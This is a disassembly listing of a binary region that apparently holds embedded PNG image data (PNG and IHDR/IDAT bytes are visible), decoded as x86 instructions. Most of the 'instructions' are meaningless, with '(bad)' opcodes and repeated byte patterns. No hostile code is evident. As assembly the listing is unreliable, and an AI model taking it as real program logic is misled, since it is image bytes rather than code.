  406e20:	inc    esp
  406e21:	cmp    DWORD PTR [ecx],edi
  406e23:	cmp    al,0x3e
  406e25:	add    BYTE PTR [eax],al
  406e27:	add    BYTE PTR [edx+0x37],cl
  406e2a:	inc    esp
  406e2b:	add    BYTE PTR [eax],al
  406e2d:	add    BYTE PTR [ecx+0x4e],bl
  406e30:	dec    edx
  406e31:	inc    esi
  406e32:	inc    eax
  406e33:	add    BYTE PTR ds:[eax],al
  406e36:	add    BYTE PTR [eax],al
  406e38:	inc    eax
  406e39:	dec    edx
  406e3a:	add    BYTE PTR ds:[eax],al
  406e3d:	add    BYTE PTR [eax],al
  406e3f:	add    BYTE PTR [esi+0x36],al
  406e42:	cmp    DWORD PTR [eax],eax
  406e44:	add    BYTE PTR [eax],al
  406e46:	add    BYTE PTR [eax],al
  406e48:	inc    esp
  406e49:	push   esp
  406e4a:	inc    eax
  406e4b:	pop    eax
  406e4c:	dec    edx
  406e4d:	inc    esi
  406e4e:	inc    esi
  406e4f:	inc    esi
  406e50:	inc    esp
  406e51:	inc    eax
  406e52:	inc    eax
  406e53:	ds ds ds ds dec esi
  406e58:	inc    eax
  406e59:	push   esp
  406e5a:	inc    eax
  406e5b:	push   ebx
  406e5c:	push   ebx
  406e5d:	push   ebx
  406e5e:	dec    esi
  406e5f:	dec    esi
  406e60:	dec    esi
  406e61:	dec    esi
  406e62:	dec    esi
  406e63:	dec    esi
  406e64:	dec    esi
  406e65:	dec    esi
  406e66:	dec    esi
  406e67:	cmp    DWORD PTR [esp+edx*2+0x40],eax
  406e6b:	push   ebx
  406e6c:	inc    eax
  406e6d:	add    eax,DWORD PTR [ebx]
  406e6f:	add    eax,DWORD PTR [edi]
  406e71:	or     al,0x12
  406e73:	adc    dl,BYTE PTR [ecx+ebx*1]
  406e76:	dec    edx
  406e77:	ds inc ebx
  406e79:	push   esp
  406e7a:	inc    eax
  406e7b:	push   esp
  406e7c:	inc    eax
  406e7d:	or     DWORD PTR [ecx],ecx
  406e7f:	push   es
  406e80:	dec    esp
  406e81:	das    
  406e82:	pop    ds
  406e83:	push   ds
  406e84:	and    ebx,DWORD PTR [edx]
  406e86:	dec    esi
  406e87:	ds cmp eax,0x40543530
  406e8d:	sbb    al,0x9
  406e8f:	push   esi
  406e90:	pop    ecx
  406e91:	pop    ebx
  406e92:	cmp    esp,DWORD PTR [edx]
  406e94:	sub    BYTE PTR [eax],ah
  406e96:	dec    esi
  406e97:	ds inc eax
  406e99:	add    DWORD PTR [edx],eax
  406e9b:	push   esp
  406e9c:	ds sbb eax,0x34145221
  406ea2:	pop    ebx
  406ea3:	sub    al,0x2c
  406ea5:	sub    DWORD PTR [esi+0x40],ecx
  406ea8:	push   esi
  406ea9:	inc    esi
  406eaa:	push   esp
  406eab:	push   esp
  406eac:	or     dl,BYTE PTR ds:[eax]
  406eaf:	adc    al,0x16
  406eb1:	and    al,0x48
  406eb3:	push   esi
  406eb4:	es and eax,0x404e
  406eba:	add    BYTE PTR [esi+edi*1+0x10],dl
  406ebe:	adc    bl,BYTE PTR [ebx]
  406ec0:	push   ss
  406ec1:	cs sub eax,0x4e264958
  406ec7:	inc    esp
  406ec8:	add    BYTE PTR [eax],al
  406eca:	add    BYTE PTR [esi+edi*1+0xd],dl
  406ece:	push   cs
  406ecf:	adc    eax,0x33332718
  406ed4:	xor    DWORD PTR [edx],ebp
  406ed6:	dec    esi
  406ed7:	inc    esp
  406ed8:	add    BYTE PTR [eax],al
  406eda:	add    BYTE PTR [esi+edi*1+0x3e],dl
  406ede:	ds ds aas 
  406ee1:	inc    eax
  406ee2:	inc    esp
  406ee3:	inc    esp
  406ee4:	inc    esp
  406ee5:	inc    esi
  406ee6:	dec    esi
  406ee7:	inc    esp
  406ee8:	add    BYTE PTR [eax],al
  406eea:	add    BYTE PTR [eax+0x54],bl
  406eed:	push   esp
  406eee:	push   esp
  406eef:	push   esp
  406ef0:	push   esp
  406ef1:	push   esp
  406ef2:	dec    esi
  406ef3:	dec    esi
  406ef4:	push   ebx
  406ef5:	dec    esi
  406ef6:	dec    esi
  406ef7:	push   esi
	...
  406f08:	(bad)  
  406f09:	inc    DWORD PTR [eax]
  406f0b:	add    BYTE PTR [edi+eax*1],bl
  406f0e:	add    BYTE PTR [eax],al
  406f10:	sbb    al,0xf
  406f12:	add    BYTE PTR [eax],al
  406f14:	pop    ds
  406f15:	pop    ds
	...
  406f32:	add    BYTE PTR [eax],al
  406f34:	loopne 0x406f36
  406f36:	add    BYTE PTR [eax],al
  406f38:	loopne 0x406f3a
  406f3a:	add    BYTE PTR [eax],al
  406f3c:	loopne 0x406f3e
  406f3e:	add    BYTE PTR [eax],al
  406f40:	loopne 0x406f42
  406f42:	add    BYTE PTR [eax],al
  406f44:	(bad)  
  406f45:	inc    DWORD PTR [eax]
  406f47:	add    BYTE PTR [ecx+0xd474e50],cl
  406f4d:	or     bl,BYTE PTR [edx]
  406f4f:	or     al,BYTE PTR [eax]
  406f51:	add    BYTE PTR [eax],al
  406f53:	or     eax,0x52444849
  406f58:	add    BYTE PTR [eax],al
  406f5a:	add    DWORD PTR [eax],eax
  406f5c:	add    BYTE PTR [eax],al
  406f5e:	add    DWORD PTR [eax],eax
  406f60:	or     BYTE PTR [esi],al
  406f62:	add    BYTE PTR [eax],al
  406f64:	add    BYTE PTR [edx+esi*2-0x58],bl
  406f68:	data16 add BYTE PTR [eax],al
  406f6b:	and    BYTE PTR [eax],al
  406f6d:	dec    ecx
  406f6e:	inc    esp
  406f6f:	inc    ecx
  406f70:	push   esp
  406f71:	js     0x406f0f
  406f73:	in     al,dx
  406f74:	mov    ebp,0xc92cb059
  406f79:	jns    0x406f5a
  406f7b:	test   ebx,0x4fdeaacc
  406f81:	neg    DWORD PTR [ecx-0x12]
  406f84:	cmp    eax,DWORD PTR ds:[esi]
  406f87:	sbb    DWORD PTR [ecx],0x0
  406f8a:	add    al,0x41
  406f8c:	pusha  
  406f8d:	inc    eax
  406f8e:	pop    eax
  406f8f:	add    BYTE PTR [edi],dl
  406f91:	or     DWORD PTR [eax],edx
  406f93:	add    DWORD PTR [ecx-0x29a4daec],ecx
  406f99:	sbb    dl,BYTE PTR [esi+0x3f2ae0ed]
  406f9f:	(bad)  
  406fa1:	mov    ebx,0x41ea37ad
  406fa6:	and    DWORD PTR ds:0xd17a1c38,edi
  406fac:	add    esp,DWORD PTR ds:0x8a1c9f87
  406fb2:	mov    al,0xb5
  406fb4:	adc    dh,BYTE PTR [ecx+eax*1]
  406fb7:	adc    ah,BYTE PTR [eax]
  406fb9:	or     BYTE PTR [edx+0x20067018],al
  406fbf:	data16 add BYTE PTR [ecx],0x6
  406fc3:	mov    bl,0xdf
  406fc5:	mov    ecx,0x3e967afb
  406fca:	mov    ebp,0x7e9992d4
  406fcf:	enter  0xeacc,0xac
  406fd3:	jmp    0x773:0x33def73e
  406fda:	or     edx,ebp
  406fdc:	pop    edi
  406fdd:	inc    esp
  406fde:	lahf   
  406fdf:	rcr    DWORD PTR [ebp-0x6b],cl
  406fe2:	mov    ch,0x65
  406fe4:	in     eax,0xf7
  406fe6:	iret   
  406fe7:	push   DWORD PTR [edi+0x65ac2664]
  406fed:	sub    eax,0x5acb596b
  406ff2:	(bad)  
  406ff3:	mov    dl,0x96
  406ff5:	mov    ch,0xac
  406ff7:	gs sub eax,0x5acb596b
  406ffd:	(bad)  
  406ffe:	mov    dl,0x96
  407000:	mov    ch,0xac
  407002:	gs sub eax,0x5acb596b
  407008:	(bad)  
  407009:	mov    dl,0x96
  40700b:	mov    ch,0xac
  40700d:	gs sub eax,0x5acb596b
  407013:	(bad)  
  407014:	mov    dl,0x96
  407016:	mov    ch,0xac
  407018:	gs sub eax,0x5acb596b
  40701e:	(bad)  
  40701f:	mov    dl,0x96
  407021:	mov    ch,0xac
  407023:	gs sub eax,0x5acb596b
  407029:	(bad)  
  40702a:	mov    dl,0x96
  40702c:	mov    ch,0xac
  40702e:	gs sub eax,0x5acb596b
  407034:	(bad)  
  407035:	mov    dl,0x96
  407037:	mov    ch,0xac
  407039:	gs sub eax,0x5acb596b
  40703f:	(bad)  
  407040:	mov    dl,0x96
  407042:	mov    ch,0xac
  407044:	gs sub eax,0x5acb596b
  40704a:	(bad)  
  40704b:	mov    dl,0x96
  40704d:	mov    ch,0xac
  40704f:	gs sub eax,0x5acb596b
  407055:	(bad)  
  407056:	mov    dl,0x96
  407058:	mov    ch,0xac
  40705a:	gs sub eax,0x5acb596b
  407060:	(bad)  
  407061:	mov    dl,0x96
  407063:	mov    ch,0xac
  407065:	gs sub eax,0x5acb596b
  40706b:	(bad)  
  40706c:	mov    dl,0x96
  40706e:	mov    ch,0xac
  407070:	gs sub eax,0x5acb596b
  407076:	(bad)  
  407077:	mov    dl,0x96
  407079:	mov    ch,0xac
  40707b:	gs sub eax,0x5acb596b
  407081:	(bad)  
  407082:	mov    dl,0x96
  407084:	mov    ch,0xac
  407086:	gs sub eax,0x5acb596b
  40708c:	(bad)  
  40708d:	mov    dl,0x96
  40708f:	mov    ch,0xac
  407091:	gs sub eax,0x5acb596b
  407097:	(bad)  
  407098:	mov    dl,0x96
  40709a:	mov    ch,0xac
  40709c:	gs sub eax,0xc452396b
  4070a2:	psubq  mm0,QWORD PTR [esi]
  4070a5:	jle    0x4070c3
  4070a7:	in     eax,0x7f
  4070a9:	jmp    DWORD PTR [edi-0x1]
  4070ac:	lods   al,BYTE PTR ds:[esi]
  4070ad:	mov    edi,0x3ea5b5b5
  4070b2:	cld    
  4070b3:	hlt    
  4070b4:	sar    DWORD PTR [esp+esi*8],cl
  4070b7:	enter  0x7923,0xb7
  4070bb:	xlat   BYTE PTR ds:[ebx]
  4070bc:	xor    edi,DWORD PTR [ebp+0x61ff2f5e]
  4070c2:	(bad)  
  4070c4:	pop    edx
  4070c5:	(bad)  
  4070c6:	jb     0x407124
  4070c8:	pop    ecx
  4070c9:	add    eax,eax
  4070cb:	xor    ebp,esp
  4070cd:	repz mov edi,0xd5a27bf7
  4070d3:	push   0xfffffffd
  4070d5:	mov    ss,WORD PTR [eax]
  4070d7:	loop   0x40713c
  4070d9:	(bad)  
  4070da:	fimul  DWORD PTR [ebx+0x42]
  4070dd:	mov    bl,cl
  4070df:	mov    bl,0xc9
  4070e1:	in     al,0x5a
  4070e3:	pop    ecx
  4070e4:	adc    al,0x37
  4070e6:	rcl    DWORD PTR [esi-0x15],cl
  4070e9:	bound  ebx,QWORD PTR [edx-0xc8420dc]
  4070ef:	cmc    
  4070f0:	xlat   BYTE PTR ds:[ebx]
  4070f1:	pop    edi
  4070f2:	mov    esi,0x18c2e17c
  4070f7:	cwde   
  4070f8:	std    
  4070f9:	outs   dx,DWORD PTR ds:[esi]
  4070fa:	push   esp
  4070fc:	lahf   
  4070fd:	into   
  4070fe:	jle    0x4070d8
  407100:	idiv   DWORD PTR [esi+edx*4+0x6b251cb5]
  407107:	add    BYTE PTR [eax],bh
  407109:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40710a:	cld    
  40710b:	rcr    DWORD PTR [edi],0xfc
  40710e:	inc    ecx
  40710f:	push   edi
  407110:	dec    ecx
  407111:	stc    
  407112:	jge    0x407135
  407114:	les    eax,FWORD PTR [ebx+0x2a]
  407117:	dec    ebp
  407118:	push   ecx
  407119:	adc    BYTE PTR [eax+0xa],0x21
  40711d:	add    al,0xd6
  40711f:	pop    edx
  407120:	retf   0xc8a2
  407123:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407124:	xchg   ebx,eax
  407125:	dec    ecx
  407126:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407127:	mov    ch,0xbe
  407129:	outs   dx,BYTE PTR ds:[esi]
  40712a:	mov    WORD PTR [ecx+0x7d],?
  40712d:	ss popf 
  40712f:	mov    esi,0xbfdfde35
  407134:	outs   dx,BYTE PTR ds:[esi]
  407135:	lods   eax,DWORD PTR ds:[esi]
  407136:	mov    ebp,0x79798c68
  40713b:	mov    esp,0x70e17fbf
  407140:	cmp    al,0xbe
  407142:	and    eax,0xafff1885
  407147:	mov    edi,0xfd95bf5
  40714c:	sti    
  40714d:	jns    0x407125
  40714f:	repnz pop edi
  407151:	mov    dh,0xac
  407153:	add    eax,esp
  407155:	cwde   
  407156:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407158:	das    
  407159:	jge    0x407144
  40715b:	xor    al,0xf0
  40715d:	sub    dh,BYTE PTR [eax]
  40715f:	dec    eax
  407160:	xchg   ebx,eax
  407161:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407162:	mov    esi,0x594c0853
  407167:	xchg   edx,eax
  407168:	out    0x39,eax
  40716a:	push   ss
  40716b:	adc    BYTE PTR [edx+0x20],al
  40716e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40716f:	inc    esp
  407170:	sub    ebp,esp
  407172:	jbe    0x4070f7
  407174:	sub    ebx,ecx
  407176:	xor    dl,bl
  407178:	pop    edx
  407179:	out    dx,eax
  40717a:	add    DWORD PTR [edi+0x77b8b80b],ebp
  407180:	sti    
  407181:	test   ch,0xc9
  407184:	loope  0x407167
  407186:	sub    eax,0x70c6d6e0
  40718b:	js     0x4071fd
  40718d:	repz cli 
  40718f:	cmc    
  407190:	sbb    ecx,0x74
  407193:	mov    edx,0x8fa3e0fb
  407198:	out    dx,al
  407199:	in     eax,dx
  40719a:	pushf  
  40719b:	cmp    al,0x39
  40719d:	(bad)  
  40719e:	out    0xd7,al
  4071a0:	mov    esi,0x93fa7e36
  4071a5:	lahf   
  4071a6:	pushf  
  4071a7:	cld    
  4071a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071a9:	dec    edi
  4071aa:	jge    0x407156
  4071ac:	cld    
  4071ad:	sar    DWORD PTR [esi],0xe9
  4071b0:	pop    edx
  4071b1:	dec    BYTE PTR [ebx-0x70]
  4071b4:	xor    eax,0xfe531c00
  4071b9:	loopne 0x4071c6
  4071bb:	pop    edi
  4071bc:	clc    
  4071bd:	dec    ecx
  4071be:	test   eax,0x2b40b3d4
  4071c3:	dec    ebp
  4071c4:	push   ebx
  4071c5:	mov    bh,0xd1
  4071c7:	pop    edx
  4071c8:	lods   al,BYTE PTR ds:[esi]
  4071c9:	jo     0x407220
  4071cb:	test   eax,0xcb2c92cb
  4071d0:	mov    al,0xd6
  4071d2:	and    al,BYTE PTR [ebp+0x85dbf00]
  4071d8:	adc    DWORD PTR [edx+edx*1+0x28024084],0x25021485
  4071e3:	and    eax,0x4210492a
  4071e8:	push   eax
  4071e9:	push   0xffffff8d
  4071eb:	aad    0x1a
  4071ed:	sub    DWORD PTR [ebp+0x5ac28846],esp
  4071f3:	pop    ebx
  4071f4:	push   0xffffffad
  4071f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071f7:	dec    ecx
  4071f8:	xchg   edx,eax
  4071f9:	mov    esp,0x34bca521
  4071fe:	lahf   
  4071ff:	dec    esi
  407200:	das    
  407201:	into   
  407202:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407203:	rcl    edi,cl
  407205:	mov    bh,0x4f
  407207:	sahf   
  407208:	cmp    al,0xf
  40720a:	pop    esp
  40720b:	jge    0x407200
  40720d:	aad    0x57
  40720f:	fistp  QWORD PTR [edx]
  407211:	jno    0x40720d
  407213:	hlt    
  407214:	in     eax,dx
  407215:	pop    edi
  407216:	clc    
  407217:	int3   
  407218:	addr16 out 0x3f,al
  40721b:	mov    WORD PTR [edx-0x407034a8],?
  407221:	lods   al,BYTE PTR ds:[esi]
  407222:	add    eax,esp
  407224:	cwde   
  407225:	repnz stc 
  407227:	das    
  407228:	jl     0x40720b
  40722a:	out    0x12,eax
  40722c:	sub    edi,edi
  40722e:	adc    BYTE PTR [ecx],ah
  407230:	fs retf 
  407232:	add    eax,DWORD PTR [eax+0x7917f68d]
  407238:	dec    esi
  407239:	xchg   ecx,eax
  40723a:	out    0x58,eax
  40723c:	jmp    0x4071f4
  40723e:	or     ch,BYTE PTR [ecx]
  407240:	adc    DWORD PTR [esi],ebx
  407242:	add    al,0xa4
  407244:	adc    BYTE PTR [eax],ah
  407246:	and    eax,0x7ef15f02
  40724b:	pop    edi
  40724c:	add    BYTE PTR [edx],cl
  40724e:	adc    esi,edi
  407250:	sti    
  407251:	std    
  407252:	popa   
  407253:	lahf   
  407254:	add    DWORD PTR [edi+ebp*1-0x69acffd5],esp
  40725b:	and    BYTE PTR [esi+ebp*1+0x2108998d],al
  407262:	sub    DWORD PTR cs:[ecx],esp
  407265:	scas   al,BYTE PTR es:[edi]
  407266:	sbb    BYTE PTR [eax+0x1afb580],bh
  40726c:	pop    ss
  40726d:	xchg   ebp,eax
  40726e:	adc    BYTE PTR [edi-0x7b],dl
  407271:	xchg   esp,eax
  407272:	scas   eax,DWORD PTR es:[edi]
  407273:	sbb    ah,BYTE PTR [ebx-0x52]
  407276:	or     ch,BYTE PTR [ecx]
  407278:	addr16 jg 0x40725c
  40727b:	adc    ebx,DWORD PTR [edi-0x4a784ca8]
  407281:	lods   al,BYTE PTR ds:[esi]
  407282:	xchg   esp,eax
  407283:	in     al,0xee
  407285:	inc    ebp
  407286:	(bad)  
  407287:	adc    cl,BYTE PTR [ebx-0x5e]
  40728a:	aam    0xc8
  40728c:	sbb    ah,BYTE PTR [ebx]
  40728e:	in     eax,0x8a
  407290:	jge    0x407294
  407292:	xor    dh,al
  407294:	pusha  
  407295:	ins    BYTE PTR es:[edi],dx
  407296:	add    al,0x9
  407298:	(bad)  
  407299:	cmp    BYTE PTR [esi],dl
  40729b:	and    BYTE PTR ds:0x31a45ac6,ah
  4072a1:	pop    eax
  4072a2:	jg     0x407258
  4072a4:	lock int3 
  4072a6:	rcr    DWORD PTR [edx-0x75],0xc0
  4072aa:	add    DWORD PTR [ecx-0x8],ecx
  4072ad:	outs   dx,DWORD PTR ds:[esi]
  4072ae:	mov    eax,ds:0xa98c2cce
  4072b3:	add    ah,0x9f
  4072b6:	pop    ebp
  4072b7:	and    eax,0xc6343249
  4072bc:	or     al,0x8d
  4072be:	mov    ch,0xef
  4072c0:	seta   BYTE PTR [ebx-0x3dd296c0]
  4072c7:	cwde   
  4072c8:	cdq    
  4072c9:	test   BYTE PTR [ebp+0x6b],bh
  4072cc:	int3   
  4072cd:	test   DWORD PTR [edi+0x15ccf33f],ebp
  4072d3:	and    ebp,esp
  4072d5:	test   DWORD PTR [ebp-0xd6fa84b],0x4dea52b2
  4072df:	imul   ebp,ebp,0x2b
  4072e2:	inc    eax
  4072e3:	test   BYTE PTR cs:[eax],ch
  4072e6:	test   DWORD PTR [eax],edx
  4072e8:	lds    eax,FWORD PTR [edi+0x3e]
  4072eb:	repnz adc DWORD PTR [ebp+0x5f],edi
  4072ef:	sub    ebp,DWORD PTR [edx+0x2d]
  4072f2:	aas    
  4072f3:	push   ss
  4072f4:	mov    dl,0x6
  4072f6:	and    BYTE PTR [ebx-0x76],0xd1
  4072fa:	cli    
  4072fb:	test   BYTE PTR [eax],cl
  4072fd:	mov    ebp,0xad695e35
  407302:	lods   eax,DWORD PTR ds:[esi]
  407303:	xchg   esp,eax
  407304:	push   esi
  407305:	or     BYTE PTR [ecx+0x2b],al
  407308:	dec    ebp
  407309:	adc    DWORD PTR [edx+0x60],eax
  40730c:	lods   al,BYTE PTR ds:[esi]
  40730d:	lds    ebx,FWORD PTR [edx]
  40730f:	jecxz  0x4072e9
  407311:	xor    BYTE PTR [ebp-0x4d62d6f8],0x1b
  407318:	add    edx,DWORD PTR [edx-0x7e]
  40731b:	mov    ch,0xa0
  40731d:	xor    eax,0x16674a46
  407322:	pop    eax
  407323:	pop    ebx
  407324:	arpl   WORD PTR [edx],ax
  407326:	add    BYTE PTR [esi-0x294cb2fb],al
  40732c:	push   esi
  40732d:	xlat   BYTE PTR ds:[ebx]
  40732e:	lds    ebx,FWORD PTR [eax]
  407330:	mov    ah,0x31
  407332:	aad    0x3d
  407334:	inc    eax
  407335:	popf   
  407336:	into   
  407337:	pop    ecx
  407338:	imul   edi,DWORD PTR [ebx+0x7108ba06],0xffffffc6
  40733f:	xchg   esp,eax
  407340:	lds    edi,FWORD PTR gs:[esi]
  407343:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407344:	xor    DWORD PTR [eax+0x63],ebx
  407347:	dec    edx
  407348:	and    ebp,esp
  40734a:	inc    esp
  40734b:	ret    0x95a1
  40734e:	jb     0x40735c
  407350:	in     al,dx
  407351:	jle    0x407346
  407353:	(bad)  
  407356:	pop    es
  407357:	mov    BYTE PTR [edx-0x78],0x3d
  40735b:	and    esp,eax
  40735d:	ins    DWORD PTR es:[edi],dx
  40735e:	pusha  
  40735f:	(bad)  
  407361:	or     bh,BYTE PTR [edx+eiz*1-0x27ec877c]
  407368:	pop    es
  407369:	popw   ds
  40736b:	(bad)  
  40736c:	lock xchg edi,edx
  40736f:	inc    eax
  407370:	icebp  
  407371:	out    0x48,eax
  407373:	(bad)  
  407374:	add    BYTE PTR [eax+0x4c],dh
  407377:	xor    esi,eax
  407379:	ins    BYTE PTR es:[edi],dx
  40737a:	add    DWORD PTR [ebx+ecx*1],esp
  40737d:	(bad)  
  40737e:	push   ds
  40737f:	or     BYTE PTR [ecx-0x59],al
  407382:	fucom  st(6)
  407384:	lea    esi,[edi]
  407386:	(bad)  
  407388:	(bad)  
  407389:	mov    edi,0xddba45f2
  40738e:	xchg   esp,eax
  40738f:	loope  0x407401
  407391:	xchg   ebx,eax
  407392:	lods   eax,DWORD PTR ds:[esi]
  407393:	lods   eax,DWORD PTR ds:[esi]
  407394:	sbb    eax,0xfa4dc346
  407399:	or     DWORD PTR ds:0x2d16ad5a,0xffffffd5
  4073a0:	es ins DWORD PTR es:[edi],dx
  4073a2:	mov    ch,0x2b
  4073a4:	pop    edx
  4073a5:	(bad)  
  4073a6:	mov    ch,0x60
  4073a8:	mov    WORD PTR [ebx+0x1],fs
  4073ab:	inc    edx
  4073ac:	mov    eax,0xa45adf1e
  4073b1:	pop    es
  4073b2:	or     eax,DWORD PTR [edx-0x67]
  4073b5:	add    BYTE PTR [eax],cl
  4073b7:	jle    0x407438
  4073b9:	adc    bl,ch
  4073bb:	scas   eax,DWORD PTR es:[edi]
  4073bc:	sub    eax,0x20c0b97c
  4073c1:	loop   0x4073c0
  4073c3:	and    al,BYTE PTR [edx]
  4073c5:	adc    cl,BYTE PTR [ecx+ecx*1+0x66304de7]
  4073cc:	test   DWORD PTR fs:[eax],ebx
  4073cf:	(bad)
  4073d2:	sub    edi,DWORD PTR [ecx+0xd]
  4073d5:	sbb    bl,BYTE PTR [eax-0x31fff1f]
  4073db:	repz iret 
  4073dd:	aas    
  4073de:	call   FWORD PTR [edx+0xe22e210]
  4073e4:	sbb    al,0x5e
  4073e6:	add    ebx,esi
  4073e8:	adc    al,0x42
  4073ea:	pop    esp
  4073eb:	push   es
  4073ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073ed:	pop    ds
  4073ee:	cli    
  4073ef:	rol    BYTE PTR [edi+0x1f8d51d6],1
  4073f5:	xor    ebx,DWORD PTR [ecx+0x3]
  4073f8:	shl    BYTE PTR [ecx],0x45
  4073fb:	sub    DWORD PTR [ebp-0x1abae9a3],esi
  407401:	rol    bl,1
  407403:	test   edx,0xc1ca56ad
  407409:	rcr    DWORD PTR [eax+0x5df9f4ff],0xa6
  407410:	xor    eax,DWORD PTR [ebp-0x51]
  407413:	jae    0x40739e
  407415:	rol    DWORD PTR [esi+0x46],1
  407418:	mov    edi,0xb69d05b
  40741d:	dec    esi
  40741e:	in     al,dx
  40741f:	or     al,0xd9
  407421:	(bad)  
  407423:	pusha  
  407424:	jae    0x4073fa
  407426:	cmp    BYTE PTR [si],bl
  407429:	mov    dl,0xbd
  40742b:	jge    0x4073af
  40742d:	shr    DWORD PTR [eax-0x6d],1
  407430:	lea    ecx,[ebp-0x68b162df]
  407436:	and    al,0x6d
  407438:	xchg   ecx,eax
  407439:	mov    ah,0x5a
  40743b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40743c:	dec    ecx
  40743d:	mov    dh,BYTE PTR [ecx+0x7057ac06]
  407443:	add    ebx,DWORD PTR [eax-0x15]
  407446:	(bad)  
  407447:	loope  0x4074a1
  407449:	inc    eax
  40744a:	in     al,dx
  40744b:	jae    0x407455
  40744d:	xlat   BYTE PTR ds:[ebx]
  40744e:	scas   eax,DWORD PTR es:[edi]
  40744f:	jle    0x407413
  407451:	add    dl,BYTE PTR [esp+edi*8]
  407454:	jle    0x407407
  407456:	inc    edx
  407457:	mov    cl,0x2b
  407459:	(bad)  
  40745a:	mov    dl,0xe2
  40745c:	sbb    DWORD PTR [ebx+0x4c],ebp
  40745f:	add    edx,DWORD PTR [ebp+esi*4+0x18842076]
  407466:	add    BYTE PTR [edi],cl
  407468:	add    BYTE PTR [edi-0x7f30eb94],bl
  40746e:	cmp    DWORD PTR [eax-0x17],esi
  407471:	fcmovnu st,st(7)
  407473:	(bad)  
  407474:	imul   BYTE PTR [ebx-0x3bdeda40]
  40747a:	adc    eax,0x22e015e0
  40747f:	jo     0x4074d2
  407481:	or     BYTE PTR [ecx+0x13],dh
  407484:	cwde   
  407485:	jl     0x407477
  407487:	sbb    DWORD PTR [edi],0xffffffb4
  40748a:	lods   al,BYTE PTR ds:[esi]
  40748b:	in     eax,0x47
  40748d:	dec    edx
  40748e:	(bad)  
  40748f:	add    BYTE PTR [eax+0x4c],dh
  407492:	mov    cl,0xc6
  407494:	mov    esp,0x1acf7c07
  407499:	jp     0x407502
  40749b:	inc    eax
  40749c:	and    bl,BYTE PTR [eax-0x10518d33]
  4074a2:	(bad)  
  4074a3:	adc    al,0xd3
  4074a5:	fnstcw WORD PTR [ecx]
  4074a7:	lods   al,BYTE PTR ds:[esi]
  4074a8:	sub    al,0xe0
  4074aa:	jp     0x407435
  4074ac:	adc    al,0x86
  4074ae:	inc    esp
  4074af:	int    0x69
  4074b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074b2:	arpl   WORD PTR [edx-0x37],bx
  4074b5:	sbb    BYTE PTR [ebp+0x75c9a4a6],ah
  4074bb:	cli    
  4074bc:	mov    ebp,0x86da74eb
  4074c1:	jbe    0x4074ce
  4074c3:	mov    dh,0xb7
  4074c5:	ficomp DWORD PTR [ecx+edi*1-0x548c982f]
  4074cc:	ret    
  4074cd:	jo     0x4074a7
  4074cf:	cmp    BYTE PTR gs:[eax-0x2f],ch
  4074d3:	jmp    0x4074fb
  4074d5:	je     0x407511
  4074d7:	or     ebp,ebx
  4074d9:	outs   dx,BYTE PTR ds:[esi]
  4074da:	fwait
  4074db:	outs   dx,BYTE PTR ds:[esi]
  4074dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074dd:	dec    edi
  4074de:	fisubr DWORD PTR [edx-0x2d]
  4074e1:	push   0x75
  4074e3:	push   0x49243ab5
  4074e8:	dec    edx
  4074e9:	xchg   edx,eax
  4074ea:	sub    BYTE PTR [esp+ecx*2+0x6b41cf9c],dl
  4074f1:	je     0x4074f3
  4074f3:	push   es
  4074f4:	fistp  WORD PTR [ebx+0x358166c7]
  4074fa:	push   es
  4074fb:	loope  0x407516
  4074fd:	mov    ecx,DWORD PTR ds:0xe0a084be
  407503:	shl    DWORD PTR [ebx],1
  407505:	les    ecx,FWORD PTR [edx+0x3b8100df]
  40750b:	in     eax,dx
  40750c:	imul   ebx,DWORD PTR [ebx+0x6b],0xffffffdb
  407510:	inc    edx
  407511:	mov    BYTE PTR [ecx],dl
  407513:	lock add esi,0x3d82c37e
  40751a:	mov    esp,0x2f8be2f2
  40751f:	pop    esi
  407520:	push   es
  407521:	cs js  0x407564
  407524:	fadd   DWORD PTR [ebx]
  407526:	mov    al,0xbe
  407529:	adc    BYTE PTR [edx-0x29],ah
  40752c:	jg     0x40754d
  40752e:	add    edi,DWORD PTR [ebx+0x42]
  407531:	mov    cl,ch
  407533:	push   ebx
  407534:	dec    edi
  407535:	cmp    eax,0xfe5c76b5
  40753a:	add    BYTE PTR [ebp+ecx*1+0x0],ah
  40753e:	(bad)  
  40753f:	nop
  407540:	(bad)  
  407542:	popf   
  407543:	fild   QWORD PTR [ecx-0x6b]
  407546:	pop    edx
  407547:	jg     0x4074f9
  407549:	jmp    0xa14a:0x25b2bdfd
  407550:	lods   eax,DWORD PTR ds:[esi]
  407551:	out    0xd6,al
  407553:	lods   eax,DWORD PTR ds:[esi]
  407554:	sub    DWORD PTR [ebp-0x67],esp
  407557:	pusha  
  407558:	inc    ebp
  407559:	loope  0x4075c7
  40755b:	jl     0x407597
  40755d:	sbb    BYTE PTR [ebx+0x5c88f5c8],ch
  407563:	aas    
  407564:	sub    BYTE PTR [ebx-0x27e7fe92],0xc5
  40756b:	pop    ds
  40756c:	outs   dx,DWORD PTR ds:[esi]
  40756d:	inc    eax
  40756e:	sbb    BYTE PTR [eax],dh
  407570:	and    eax,0xf4d08050
  407575:	cmp    eax,DWORD PTR [edi+0x7487db74]
  40757b:	cmp    esi,DWORD PTR [ebx+0x7a]
  40757e:	popf   
  40757f:	cmp    ebx,eax
  407581:	fisub  WORD PTR [ecx]
  407583:	mov    ebp,0x276e8cf6
  407588:	jecxz  0x40756e
  40758a:	dec    esi
  40758b:	(bad)  
  40758c:	popf   
  40758d:	in     eax,dx
  40758e:	add    DWORD PTR [ebx],ebx
  407590:	sbb    ebx,DWORD PTR ds:0xd83736b6
  407596:	(bad)  
  407598:	mov    ds:0xd8321fd7,al
  40759d:	sbb    dl,dl
  40759f:	in     eax,dx
  4075a0:	or     eax,0x548a5448
